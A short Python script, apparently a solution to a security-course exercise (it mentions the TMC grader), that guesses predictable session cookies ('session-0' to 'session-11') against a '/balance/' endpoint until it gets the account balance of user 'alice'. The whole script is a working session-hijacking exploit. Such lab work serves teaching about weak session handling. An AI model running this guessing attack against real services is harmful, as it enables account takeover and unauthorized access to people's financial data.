import sys
import requests
import json


def test_session(address):
	session_counter = 0
	while True:
		session_key = 'session-' + str(session_counter)
		session_counter += 1
	
		response = requests.get(f'{address}/balance/', cookies={'sessionid': session_key})	 
	#for id in range(1, 12):
	#	session_id = f'session-{id}'

	#	response = requests.get(f'{address}/balance/', cookies={'sessionid': session_id})

	
		if response.status_code == 200:
			try:
				data = json.loads(response.text)
				if 'username' in data and data['username'] == 'alice' and 'balance' in data:
					return data['balance']
			except json.JSONDecodeError:
				pass
		if session_counter > 11:
			break
	return None


def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
